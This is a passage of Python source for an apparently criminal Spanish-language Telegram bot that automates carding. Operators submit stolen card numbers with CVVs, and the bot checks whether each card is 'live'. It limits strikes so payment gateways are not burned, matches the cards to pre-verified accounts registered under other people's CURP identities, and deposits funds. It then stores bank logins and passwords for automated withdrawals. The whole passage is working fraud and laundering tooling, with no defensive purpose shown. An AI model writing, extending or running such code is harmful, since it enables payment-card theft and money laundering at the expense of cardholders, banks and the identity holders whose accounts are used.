        "<code>4111111111111111|12|28|123</code>\n\n"
        "• 1 a 4 tarjetas por intento (una por línea).\n"
        "• Matching automático con cuentas calificadas (A+ / KYC).\n"
        "• Validación liveness en tiempo real."
    )
    await update.message.reply_text(
        msg,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🏠 Volver al inicio", callback_data="cancel_bet")],
            ]
        ),
    )
    return WAIT_BET_CONFIRM


async def process_bet_input(update: Update, context: ContextTypes.DEFAULT_TYPE, override_text: Optional[str] = None):
    """Procesa las tarjetas ingresadas para /bet con validación de liveness."""
    text = (override_text or (update.message.text if update.message else "") or "").strip()
    if text.startswith("/") and not any(char.isdigit() for char in text):
        await update.message.reply_text("❌ Envía las tarjetas, no un comando.")
        return WAIT_BET_CONFIRM

    # Limpiar líneas de tarjetas
    lines = [
        line.strip()
        for line in text.splitlines()
        if line.strip() and not line.startswith("/")
    ]
    if not lines and text.startswith("/bet"):
        parts = text.split(maxsplit=1)
        if len(parts) > 1:
            lines = [line.strip() for line in parts[1].splitlines() if line.strip()]

    if not lines or len(lines) > 4:
        await update.message.reply_text(
            "❌ Debes enviar entre 1 y 4 tarjetas por intento."
        )
        return WAIT_BET_CONFIRM

    operator_id = update.effective_user.id
    MAX_DAILY_STRIKES = 5

    # Comprobar strikes
    with db(write=True) as c:
        row = c.execute(
            "SELECT strikes_count, penalty_until FROM operator_penalties WHERE telegram_id=?",
            (operator_id,),
        ).fetchone()
        strikes_count = (row["strikes_count"] or 0) if row else 0

    if strikes_count >= MAX_DAILY_STRIKES:
        await update.message.reply_text(
            f"{HEADER}\n\n"
            f"❌ <b>Límite de {MAX_DAILY_STRIKES} strikes diarios alcanzado.</b> Contacta al SuperAdmin.\n"
            f"<i>Los strikes previenen el quema de pasarelas con tarjetas inválidas.</i>",
            parse_mode="HTML",
        )
        return ConversationHandler.END

    # Validar liveness via puente ruthopia (RF1/RF2/RF3)
    live_pipes = []
    tol_pipes = []
    liveness_records = []
    seen_pans = set()
    for pipe in lines:
        ok, reason, parsed = precheck_card_liveness(pipe)
        kind = parsed.get("liveness_kind", "dead") if parsed else "dead"
        c_num = parsed.get("card_number") if parsed else ""
        if c_num and c_num in seen_pans:
            liveness_records.append({"pipe": pipe, "ok": False, "status_label": "🔴 DUPLICADA - Misma tarjeta en el combo"})
            continue
        if c_num:
            seen_pans.add(c_num)
        liveness_records.append({"pipe": pipe, "ok": ok, "status_label": reason})
        logger.info(
            f"[CARD_TOUCH] operator={operator_id} | account=N/A(precheck) | "
            f"pipe={pipe} | status={kind} | reason={reason}"
        )
        if ok and kind in ("live", "tol_bin", "tol_reason"):
            if kind == "live":
                live_pipes.append(parsed["pipe_3parts"])
            else:
                tol_pipes.append(parsed["pipe_3parts"])

    summary_text = format_ruthopia_liveness_summary(liveness_records)
    strikes_left = MAX_DAILY_STRIKES - strikes_count
    valid_pipes = live_pipes + tol_pipes
    live_count = len(live_pipes)

    if not valid_pipes:
        fail_msg = (
            f"{HEADER}\n\n"
            f"🔴 <b>CARDING FALLIDO — SIN TARJETAS LIVE</b>\n\n"
            f"• 💳 CCs LIVE: <b>0</b>\n"
            f"• ⚠️ Strikes acumulados: <b>{strikes_count} / {MAX_DAILY_STRIKES}</b>\n\n"
            f"{summary_text}"
        )
        kb_fail = InlineKeyboardMarkup(
            [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
        )
        await update.message.reply_text(fail_msg, parse_mode="HTML", reply_markup=kb_fail)
        return ConversationHandler.END

    # RF7: confirmación antes del auto match (se restauró lo que quitó 668ab62)
    context.user_data["pending_bet_pipes"] = valid_pipes
    context.user_data["pending_tol_pipes"] = tol_pipes
    confirm_msg = (
        f"{HEADER}\n\n"
        f"💳 <b>Filtro de tarjetas completado</b>\n\n"
        f"• ✅ Aceptadas (LIVE): <b>{live_count}</b>\n"
        f"• 🟡 Toleradas: <b>{len(tol_pipes)}</b>\n"
        f"• ❌ Descartadas: <b>{len(lines) - len(valid_pipes)}</b>\n\n"
        f"{summary_text}\n\n"
        f"¿Continuar al auto match de cuentas?"
    )
    kb = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("🚀 De Una / Auto Match", callback_data="confirm_bet"),
                InlineKeyboardButton("🏠 Volver al inicio", callback_data="cancel_bet"),
            ],
        ]
    )
    await update.message.reply_text(confirm_msg, parse_mode="HTML", reply_markup=kb)
    return WAIT_BET_CONFIRM



def _launch_auto_mission_ui(
    context: ContextTypes.DEFAULT_TYPE,
    operator_id: int,
    mission_id: str,
    plan: Dict[str, Any],
    user_info: dict,
    status_msg: object,
):
    """Arranca run_auto_mission en background con telemetría 100% real, on_progress y confirm_gate."""
    last_edit_ts = [0.0]
    loop = asyncio.get_running_loop()

    state = {
        "status": "matching",
        "extra": {},
        "is_terminal": False,
        "stopped": False,
        "start_time": time.time(),
    }

    def on_progress(status: str, extra: dict):
        now = time.time()
        state["status"] = status
        state["extra"].update(extra)

        if status == "awaiting_confirmation":
            return

        if (
            status in ("completed", "cancelled", "failed")
            and mission_id in _gate_closed_missions
        ):
            state["stopped"] = True
            return
        if status in ("completed", "cancelled", "failed"):
            state["is_terminal"] = True
            state["stopped"] = True
            _gate_closed_missions.discard(mission_id)

        st_text = _mission_status_text(status, extra)
        is_terminal = status in ("completed", "cancelled", "failed")
        is_priority = status in (
            "awaiting_confirmation",
            "completed",
            "cancelled",
            "failed",
            "preparing",
        )
        if not is_priority and (now - last_edit_ts[0] < 1.5):
            return
        last_edit_ts[0] = now

        if is_terminal:
            _active_operator_missions.pop(operator_id, None)
            if status in ("cancelled", "failed"):
                text = (
                    f"{HEADER}\n\n"
                    f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
                    f"• {st_text}\n\n"
                    f"🔄 <i>Proceso terminado. Puedes iniciar una nueva misión.</i>"
                )
                kb_btns = [
                    [
                        InlineKeyboardButton(
                            "🏠 Volver al inicio",
                            callback_data="btn_start_cancel",
                        )
                    ]
                ]
                if status == "failed" and extra.get("reason") == "sin matches":
                    kb_btns.insert(
                        0,
                        [
                            InlineKeyboardButton(
                                "🔁 Segundo intento con nuevo combo",
                                callback_data=f"retry_mission_{mission_id}",
                            )
                        ],
                    )
                kb = InlineKeyboardMarkup(kb_btns)
            else:
                # ÉXITO: Misión completada — Ficha SPEI in-bot limpia
                matches = extra.get("matches") or []
                match_obj = matches[0] if matches else {}
                account_id = match_obj.get("account_id")
                email = match_obj.get("email") or extra.get("email") or "N/A"
                clabe_stp = match_obj.get("clabe_stp") or extra.get("clabe_stp") or ""

                curp = ""
                try:
                    with db() as c:
                        if account_id:
                            row_ac = c.execute(
                                "SELECT curp, fullname FROM accounts WHERE id=?", (account_id,)
                            ).fetchone()
                        else:
                            row_ac = c.execute(
                                "SELECT id, curp, fullname FROM accounts WHERE email=?", (email,)
                            ).fetchone()
                            if row_ac:
                                account_id = row_ac["id"]
                        if row_ac and row_ac["curp"]:
                            curp = row_ac["curp"]
                except Exception as ex_curp:
                    logger.warning(f"[Bot] No pude leer CURP de BD: {ex_curp}")

                if not clabe_stp and account_id:
                    try:
                        clabes = get_saved_clabes(DB_PATH, account_id)
                        stp_c = next((cl.get("clabe") for cl in clabes if str(cl.get("integration")) in ("STP", "2")), None)
                        if stp_c:
                            clabe_stp = stp_c
                    except Exception:
                        pass

                _pending_spei_fundings[operator_id] = {
                    "mission_id": mission_id,
                    "account_id": account_id,
                    "email": email,
                    "clabe_stp": clabe_stp,
                    "curp": curp,
                }

                dep = extra.get("deposited", 0)
                text = (
                    f"{HEADER}\n\n"
                    f"🎉 <b>¡MISIÓN {mission_id} COMPLETADA!</b>\n\n"
                    f"• 💰 Total depositado: <b>${dep:,.2f} MXN</b>\n"
                    f"• 👤 Cuenta asignada: <code>{email}</code>\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📑 <b>FICHA DE FONDEO SPEI</b>\n\n"
                    f"Envía tu SPEI ($10 o $20 MXN) para vincular tu cuenta de retiro:\n\n"
                    f"• 🏦 <b>CLABE STP:</b>\n<code>{clabe_stp or 'Consultar en soporte'}</code>\n\n"
                    f"• 🆔 <b>CURP Titular:</b>\n<code>{curp or 'No asignado'}</code>\n\n"
                    f"<i>(Toca sobre la CLABE o CURP para copiar rápido)</i>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"👉 <i>Una vez enviado tu SPEI, presiona el botón abajo para validar y habilitar tu retiro automático.</i>"
                )
                kb = InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                "✅ Ya mandé el SPEI",
                                callback_data=f"verify_spei_{mission_id}",
                            )
                        ],
                        [
                            InlineKeyboardButton(
                                "🏠 Volver al inicio",
                                callback_data="btn_start_cancel",
                            )
                        ],
                    ]
                )
        else:
            text = (
                f"{HEADER}\n\n"
                f"🎯 <b>MISIÓN {mission_id} EN CURSO</b>\n\n"
                f"• {st_text}\n\n"
                f"🔄 <i>Actualización en tiempo real…</i>"
            )
            kb = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🛑 Detener Misión",
                            callback_data=f"stop_mission_{mission_id}",
                        )
                    ]
                ]
            )

        async def _edit():
            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=kb)
            except Exception as ex:
                logger.warning(
                    f"[Bot] [Auto {mission_id}] edit_text falló (status={status}): {ex}"
                )
                if is_terminal:
                    try:
                        await context.bot.send_message(
                            chat_id=operator_id,
                            text=text,
                            parse_mode="HTML",
                            reply_markup=kb,
                        )
                    except Exception as ex2:
                        logger.warning(
                            f"[Bot] [Auto {mission_id}] fallback send_message también falló: {ex2}"
                        )

        asyncio.run_coroutine_threadsafe(_edit(), loop)

    async def confirm_gate(gate_info: dict) -> bool:
        state["status"] = "awaiting_confirmation"
        m_id = gate_info["mission_id"]
        matches = gate_info["matches"]
        amt = gate_info.get("amount", 150.0)
        target = gate_info.get("target_count", 9)

        ev = asyncio.Event()
        _confirm_events[m_id] = (ev, {"decision": False})

        match_lines = []
        for m in matches:
            em = m.get("email", "")
            c_stp = m.get("clabe_stp")
            if c_stp:
                match_lines.append(
                    f"• <code>{em}</code>\n  CLABE STP: <code>{c_stp}</code>"
                )
            else:
                match_lines.append(f"• <code>{em}</code>")

        match_text_block = "\n".join(match_lines)
        confirm_text = (
            f"{HEADER}\n\n"
            f"⚡ <b>CUENTA ENGANCHADA — LISTA PARA ACREDITACIÓN</b>\n\n"
            f"• Cuenta vinculada: {len(matches)}\n"
            f"{match_text_block}\n\n"
            f"¿Deseas iniciar la acreditación de fondos en segundo plano?"
        )
        kb_confirm = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🚀 Iniciar Acreditación",
                        callback_data=f"confirm_sched_{m_id}",
                    ),
                    InlineKeyboardButton(
                        "🛑 Detener", callback_data=f"stop_sched_{m_id}"
                    ),
                ],
            ]
        )
        try:
            await status_msg.edit_text(
                confirm_text, parse_mode="HTML", reply_markup=kb_confirm
            )
        except Exception as ex:
            logger.warning(f"[Bot] No pude editar mensaje a confirm_gate: {ex}")

        try:
            await asyncio.wait_for(ev.wait(), timeout=600.0)
            res = _confirm_events.get(m_id, (None, {"decision": False}))[1].get(
                "decision", False
            )
        except asyncio.TimeoutError:
            res = False
            try:
                await status_msg.edit_text(
                    f"{HEADER}\n\nTiempo agotado. Operación cancelada.\n\n"
                    f"🌵 {get_random_greeting()}",
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "🏠 Volver al inicio",
                                    callback_data="btn_start_cancel",
                                )
                            ]
                        ]
                    ),
                )
            except Exception:
                pass
        finally:
            _confirm_events.pop(m_id, None)

        return res

    asyncio.create_task(
        run_auto_mission(
            mission_id,
            plan,
            user_info,
            on_progress=on_progress,
            confirm_gate=confirm_gate,
        )
    )



async def handle_bet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja la confirmación de /bet."""
    query = update.callback_query
    await query.answer()

    if query.data == "cancel_bet":
        context.user_data.pop("pending_bet_pipes", None)
        await query.edit_message_text("❌ Proceso /bet cancelado.")
        return ConversationHandler.END

    if query.data == "confirm_bet":
        try:
            valid_pipes = context.user_data.get("pending_bet_pipes", [])
            if not valid_pipes:
                await query.edit_message_text("❌ No hay tarjetas guardadas.")
                return ConversationHandler.END

            if _mission_sem.locked():
                await query.edit_message_text(
                    "⚠️ Ya hay una misión de depósitos activa en el sistema. Intenta de nuevo en unos momentos."
                )
                return ConversationHandler.END

            operator_id = update.effective_user.id
            amount = 150.0
            target_count = 9

            tol_pipes = context.user_data.get("pending_tol_pipes", [])
            # RF4: pasar tol_pipes al plan
            plan = plan_auto_mission(DB_PATH, valid_pipes, amount, target_count, tol_pipes=tol_pipes)
            if not plan.get("feasible"):
                await query.edit_message_text(
                    f"❌ No fue posible armar el plan: {plan.get('reason', 'desconocido')}"
                )
                return ConversationHandler.END

            from uuid import uuid4

            mission_id = str(uuid4())[:8]
            user_info = {
                "telegram_id": operator_id,
                "username": update.effective_user.username or "operator",
            }

            _persist_auto_mission(
                mission_id, operator_id, valid_pipes, amount, target_count, plan
            )
        except Exception as e:
            logger.exception(f"[handle_bet_callback] Error al confirmar bet: {e}")
            await query.edit_message_text(
                "❌ Error interno al iniciar la misión. Intenta de nuevo o contacta al SuperAdmin."
            )
            return ConversationHandler.END

        # Mensaje base inicial de la misión — feedback limpio y entretenido
        status_msg = await query.edit_message_text(
            f"{HEADER}\n\n"
            f"🎯 <b>MISIÓN {mission_id}</b>\n\n"
            f"• Estado: Rastreando cuentas aptas en el pool…\n"
            f"  <code>[■■□□□□□□□□] 15%</code>\n\n"
            f"📡 <i>Escaneando nodos seguros · ETA: ~45s</i>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🛑 Detener Misión",
                            callback_data=f"stop_mission_{mission_id}",
                        )
                    ],
                ]
            ),
        )

        _launch_auto_mission_ui(
            context, operator_id, mission_id, plan, user_info, status_msg
        )
        return ConversationHandler.END



async def handle_confirm_gate_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Maneja las respuestas de confirmación explícita (confirm_sched / stop_sched)."""
    query = update.callback_query
    await query.answer()
    data = query.data or ""
    if data.startswith("confirm_sched_"):
        mission_id = data.replace("confirm_sched_", "").strip()
        item = _confirm_events.get(mission_id)
        if item:
            ev, state = item
            state["decision"] = True
            ev.set()
        await query.edit_message_text(
            f"✅ <b>Acreditación de fondos iniciada.</b>\nProcesando saldo en segundo plano...",
            parse_mode="HTML",
        )
    elif data.startswith("stop_sched_"):
        mission_id = data.replace("stop_sched_", "").strip()
        _gate_closed_missions.add(mission_id)
        item = _confirm_events.get(mission_id)
        if item:
            ev, state = item
            state["decision"] = False
            ev.set()
        await query.edit_message_text(
            f"🛑 <b>Proceso detenido por el operador.</b>\nOperación finalizada.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🏠 Volver al inicio", callback_data="btn_start_cancel"
                        )
                    ]
                ]
            ),
        )


async def handle_stop_mission_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Maneja el botón '🛑 Detener Misión' enviado durante la ejecución de la misión."""
    query = update.callback_query
    await query.answer()
    if query.data.startswith("stop_mission_"):
        mission_id = query.data.replace("stop_mission_", "").strip()
        user_id = update.effective_user.id
        _gate_closed_missions.add(mission_id)
        _active_operator_missions.pop(user_id, None)

        with db(write=True) as c:
            c.execute(
                "UPDATE auto_missions SET status='cancelled' WHERE mission_id=?",
                (mission_id,),
            )
        await query.edit_message_text(
            f"🛑 <b>Misión {mission_id} detenida por el operador.</b>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🏠 Volver al inicio", callback_data="btn_start_cancel"
                        )
                    ]
                ]
            ),
        )


async def handle_retry_mission_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """RF8: segundo intento de una misión que terminó sin match (botón 🔁)."""
    q = update.callback_query
    await q.answer()
    m_id = q.data.split("_", 2)[2]
    operator_id = update.effective_user.id
    try:
        with db(write=True) as c:
            row = c.execute(
                "SELECT card_pipes, amount, target_count, operator_id "
                "FROM auto_missions WHERE mission_id=?",
                (m_id,),
            ).fetchone()
    except Exception:
        row = None
    if not row:
        await q.edit_message_text("Misión no encontrada.", parse_mode="HTML")
        return
    if int(row["operator_id"]) != operator_id:
        await q.edit_message_text(
            "No autorizado para reintentar esta misión.", parse_mode="HTML"
        )
        return
    if _mission_sem.locked():
        await q.edit_message_text(
            "Ya hay una misión en curso. Espera a que termine antes del segundo intento.",
            parse_mode="HTML",
        )
        return
    try:
        card_pipes = json.loads(row["card_pipes"] or "[]")
    except Exception:
        card_pipes = []
    amount = float(row["amount"] or 150)
    target_count = int(row["target_count"] or 9)
    if not card_pipes:
        await q.edit_message_text("No hay tarjetas para reintentar.", parse_mode="HTML")
        return

    user_info = {
        "telegram_id": operator_id,
        "username": get_user_nickname(operator_id, "operador"),
    }
    plan = plan_auto_mission(DB_PATH, card_pipes, amount, target_count)
    if not plan["feasible"]:
        await q.edit_message_text(
            f"{HEADER}\n\n"
            f"❌ No hay cuentas viables para un segundo intento en este momento.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
            ),
        )
        return

    from uuid import uuid4

    new_id = str(uuid4())[:8]
    _persist_auto_mission(new_id, operator_id, card_pipes, amount, target_count, plan)

    status_msg = await q.edit_message_text(
        f"{HEADER}\n\n"
        f"🔁 <b>SEGUNDO INTENTO EN MARCHA</b>\n\n"
        f"🎯 <b>MISIÓN {new_id}</b>\n"
        f"• Estado: Rastreando cuentas alternativas en el pool…\n"
        f"  <code>[■■□□□□□□□□] 15%</code>\n\n"
        f"📡 <i>Escaneando nuevo combo de respaldo…</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🛑 Detener Misión",
                        callback_data=f"stop_mission_{new_id}",
                    )
                ],
            ]
        ),
    )

    _launch_auto_mission_ui(
        context, operator_id, new_id, plan, user_info, status_msg
    )
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────────
# FLUJO DE VERIFICACIÓN SPEI, ACCESOS BANCARIOS Y RETIRO IN-BOT
# ─────────────────────────────────────────────────────────────────────

def _normalize_bank_key(institution_name: str) -> str:
    """Normaliza el nombre de la institución para mapear los campos requeridos de acceso."""
    n = (institution_name or "").strip().lower()
    if "claropay" in n or "inbursa" in n:
        return "claropay"
    if "hey" in n:
        return "hey"
    if "banorte" in n:
        return "banorte"
    if "mifel" in n:
        return "mifel"
    if "clip" in n:
        return "clip"
    if "openbank" in n or "open" in n:
        return "openbank"
    return "general"


def _get_bank_access_requirements(bank_key: str) -> dict:
    """Retorna los requerimientos de credenciales según el banco."""
    reqs = {
        "claropay": {
            "name": "Claro Pay (Inbursa)",
            "fields": ["phone"],
            "prompt": "Envía el <b>Número de Teléfono</b> registrado en tu cuenta Claro Pay:",
            "example": "<code>5512345678</code>",
        },
        "hey": {
            "name": "Hey Banco",
            "fields": ["phone", "email", "username"],
            "prompt": "Envía los datos de tu cuenta Hey Banco en este formato:\n<code>telefono|correo|usuario</code>",
            "example": "<code>5512345678|tu_correo@gmail.com|tu_usuario</code>",
        },
        "banorte": {
            "name": "Banorte Móvil",
            "fields": ["phone"],
            "prompt": "Envía el <b>Número de Teléfono</b> asociado a tu banca Banorte:",
            "example": "<code>5512345678</code>",
        },
        "mifel": {
            "name": "Mifel",
            "fields": ["phone", "email", "username", "password"],
            "prompt": "Envía los accesos de tu cuenta Mifel en este formato:\n<code>telefono|correo|usuario|contraseña</code>",
            "example": "<code>5512345678|correo@mail.com|mi_user|MiPass123</code>",
        },
        "clip": {
            "name": "Clip Now",
            "fields": ["phone"],
            "prompt": "Envía el <b>Número de Teléfono</b> de tu cuenta Clip Now:",
            "example": "<code>5512345678</code>",
        },
        "openbank": {
            "name": "Openbank",
            "fields": ["phone", "email"],
            "prompt": "Envía los accesos de tu cuenta Openbank en este formato:\n<code>telefono|correo</code>",
            "example": "<code>5512345678|tu_correo@gmail.com</code>",
        },
        "general": {
            "name": "Banca Digital",
            "fields": ["phone"],
            "prompt": "Envía tu <b>Teléfono o Referencia de Acceso</b> de retiro:",
            "example": "<code>5512345678</code>",
        },
    }
    return reqs.get(bank_key, reqs["general"])


async def handle_verify_spei_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja el botón '✅ Ya mandé el SPEI' tras completar la misión."""
    query = update.callback_query
    await query.answer()
    operator_id = update.effective_user.id
    data = query.data or ""
    mission_id = data.replace("verify_spei_", "").strip()

    pending_info = _pending_spei_fundings.get(operator_id)
    if not pending_info or pending_info.get("mission_id") != mission_id:
        try:
            with db() as c:
                row_m = c.execute(
                    "SELECT matches FROM auto_missions WHERE mission_id=?", (mission_id,)
                ).fetchone()
                if row_m:
                    m_arr = json.loads(row_m["matches"] or "[]")
                    if m_arr:
                        pending_info = {
                            "mission_id": mission_id,
                            "account_id": m_arr[0].get("account_id"),
                            "email": m_arr[0].get("email"),
                        }
        except Exception:
            pass

    if not pending_info:
        await _edit_msg(
            query,
            f"{HEADER}\n\n❌ <b>No se encontró información de la misión.</b>",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
            ),
        )
        return

    account_id = pending_info.get("account_id")
    email = pending_info.get("email")

    await _edit_msg(
        query,
        f"{HEADER}\n\n"
        f"🔍 <b>Validando acreditación SPEI y cuenta de retiro…</b>\n"
        f"  <code>[■■■■■□□□□□] 50%</code>\n\n"
        f"🛰️ <i>Consultando pasarela de pagos…</i>",
    )

    jwt, email_db, _ = _load_jwt_for_account(DB_PATH, account_id)
    proxy_url = _get_admin_proxy_url()

    approved_accounts = []
    if jwt:
        try:
            approved_accounts = await get_bank_accounts(jwt, proxy_url)
        except Exception as ex_b:
            logger.warning(f"[Bot] Error consultando cuentas de retiro: {ex_b}")

    if not approved_accounts:
        # Reintentar o avisar que aún no cae el SPEI
        kb = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🔄 Reintentar Validación", callback_data=f"verify_spei_{mission_id}")],
                [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")],
            ]
        )

        await _edit_msg(
            query,
            f"{HEADER}\n\n"
            f"⏳ <b>Acreditación bancaria en tránsito</b>\n\n"
            f"• Cuenta: <code>{email}</code>\n"
            f"• Estado: El SPEI aún no se refleja en el sistema.\n\n"
            f"<i>Los bancos suelen tardar de 30 a 90 segundos en asentar la transferencia. Espera un momento y vuelve a presionar el botón.</i>",
            reply_markup=kb,
        )
        return

    bank_acc = approved_accounts[0]
    bank_name = bank_acc.get("institutionName", "Banco")
    account_digits = str(bank_acc.get("account", ""))[-4:]
    bank_key = _normalize_bank_key(bank_name)

    # Revisar si ya existen accesos guardados en account_withdrawal_access
    saved_access = None
    try:
        with db() as c:
            row_acc = c.execute(
                "SELECT * FROM account_withdrawal_access WHERE account_email=? AND bank_name=? LIMIT 1",
                (email, bank_name),
            ).fetchone()
            if row_acc:
                saved_access = dict(row_acc)
    except Exception as ex_acc:
        logger.warning(f"[Bot] Error leyendo account_withdrawal_access: {ex_acc}")

    # CASO 1: Si ya fue configurada previamente
    if saved_access:
        saved_op_id = saved_access.get("operator_id")
        saved_op_name = saved_access.get("operator_name") or f"Operador_{saved_op_id}"

        if saved_op_id == operator_id:
            # Mismo operador: recordatorio proactivo y confirmación directa
            phone_hint = saved_access.get("phone") or "Registrado"
            context.user_data["pending_withdrawal"] = {
                "account_id": account_id,
                "email": email,
                "bank_name": bank_name,
                "account_digits": account_digits,
            }
            kb = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🚀 Iniciar Retiro Automático",
                            callback_data=f"confirm_auto_withdrawal_{account_id}",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            "✏️ Actualizar mis accesos",
                            callback_data=f"edit_bank_access_{account_id}",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            "🏠 Volver al inicio",
                            callback_data="btn_start_cancel",
                        )
                    ],
                ]
            )
            await _edit_msg(
                query,
                f"{HEADER}\n\n"
                f"🏦 <b>CUENTA DE RETIRO DETECTADA & RECORDADA</b>\n\n"
                f"• Banco: <b>{bank_name}</b> (Terminación: <code>••••{account_digits}</code>)\n"
                f"• Titular / Cuenta: <code>{email}</code>\n"
                f"• Acceso guardado: Teléfono <code>{phone_hint}</code>\n\n"
                f"✨ <i>Ya habías retirado de esta cuenta. Tus accesos están listos.</i>\n\n"
                f"¿Deseas iniciar el retiro automático por fases?",
                reply_markup=kb,
            )
            return
        else:
            # Asignada por otro operador: avisar quién la configuró
            context.user_data["pending_bank_access"] = {
                "account_id": account_id,
                "email": email,
                "bank_name": bank_name,
                "account_digits": account_digits,
                "bank_key": bank_key,
            }
            req_info = _get_bank_access_requirements(bank_key)
            kb = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "🚀 Continuar y Retirar",
                            callback_data=f"confirm_auto_withdrawal_{account_id}",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            "🏠 Volver al inicio",
                            callback_data="btn_start_cancel",
                        )
                    ],
                ]
            )
            await _edit_msg(
                query,
                f"{HEADER}\n\n"
                f"🏦 <b>CUENTA BANCARIA DETECTADA</b>\n\n"
                f"• Banco: <b>{bank_name}</b> (Terminación: <code>••••{account_digits}</code>)\n"
                f"• Cuenta: <code>{email}</code>\n\n"
                f"ℹ️ <b>Nota de Asignación:</b>\n"
                f"Esta cuenta bancaria fue enlazada originalmente por <b>{saved_op_name}</b>. Si requieres acceso a la app bancaria para recibir la dispersión, contáctale para apoyo.\n\n"
                f"Si prefieres registrar nuevos datos de acceso para ti, responde en el chat con tu información, o presiona 'Continuar y Retirar':",
                reply_markup=kb,
            )
            return

    # CASO 2: Cuenta nueva / sin accesos previos registrados -> Solicitar datos de acceso
    context.user_data["pending_bank_access"] = {
        "account_id": account_id,
        "email": email,
        "bank_name": bank_name,
        "account_digits": account_digits,
        "bank_key": bank_key,
    }
    req_info = _get_bank_access_requirements(bank_key)

    kb = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]
        ]
    )

    await _edit_msg(
        query,
        f"{HEADER}\n\n"
        f"🏦 <b>CUENTA DE RETIRO VINCULADA</b>\n\n"
        f"• Banco: <b>{bank_name}</b>\n"
        f"• Terminación: <code>••••{account_digits}</code>\n"
        f"• Titular / Cuenta: <code>{email}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>REGISTRO DE ACCESOS BANCARIOS ({req_info['name']})</b>\n\n"
        f"{req_info['prompt']}\n"
        f"Ejemplo: {req_info['example']}\n\n"
        f"<i>(Esto permite recordar tu acceso para futuros retiros sin fricción)</i>",
        reply_markup=kb,
    )


async def handle_edit_bank_access_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Permite al operador re-ingresar sus credenciales si cambiaron."""
    query = update.callback_query
    await query.answer()
    account_id_str = query.data.replace("edit_bank_access_", "").strip()
    account_id = int(account_id_str)

    pending = context.user_data.get("pending_withdrawal", {})
    bank_name = pending.get("bank_name", "Banco")
    bank_key = _normalize_bank_key(bank_name)
    req_info = _get_bank_access_requirements(bank_key)

    context.user_data["pending_bank_access"] = {
        "account_id": account_id,
        "email": pending.get("email"),
        "bank_name": bank_name,
        "account_digits": pending.get("account_digits"),
        "bank_key": bank_key,
    }

    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
    )

    await _edit_msg(
        query,
        f"{HEADER}\n\n"
        f"🔑 <b>ACTUALIZAR ACCESOS ({req_info['name']})</b>\n\n"
        f"{req_info['prompt']}\n"
        f"Ejemplo: {req_info['example']}\n\n"
        f"Envía los nuevos datos en el chat para guardarlos:",
        reply_markup=kb,
    )


async def process_bank_access_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Procesa el mensaje de texto del operador con los accesos bancarios."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return

    text = update.message.text.strip()
    bank_info = context.user_data.get("pending_bank_access")
    if not bank_info:
        return

    account_id = bank_info["account_id"]
    email = bank_info["email"]
    bank_name = bank_info["bank_name"]
    bank_digits = bank_info["account_digits"]
    bank_key = bank_info["bank_key"]
    nickname = get_user_nickname(user_id, update.effective_user.first_name)

    parts = [p.strip() for p in text.split("|")]
    phone, acc_email, username, password = None, None, None, None

    if bank_key in ("claropay", "banorte", "clip", "general"):
        phone = parts[0]
    elif bank_key == "hey":
        phone = parts[0] if len(parts) > 0 else None
        acc_email = parts[1] if len(parts) > 1 else None
        username = parts[2] if len(parts) > 2 else None
    elif bank_key == "mifel":
        phone = parts[0] if len(parts) > 0 else None
        acc_email = parts[1] if len(parts) > 1 else None
        username = parts[2] if len(parts) > 2 else None
        password = parts[3] if len(parts) > 3 else None
    elif bank_key == "openbank":
        phone = parts[0] if len(parts) > 0 else None
        acc_email = parts[1] if len(parts) > 1 else None

    # Guardar en BD
    now_iso = datetime.now(timezone.utc).isoformat()
    try:
        with db(write=True) as c:
            c.execute(
                "INSERT OR REPLACE INTO account_withdrawal_access "
                "(account_email, account_id, operator_id, operator_name, bank_name, bank_digits, phone, email, username, password, extra_data, created_at, updated_at) "
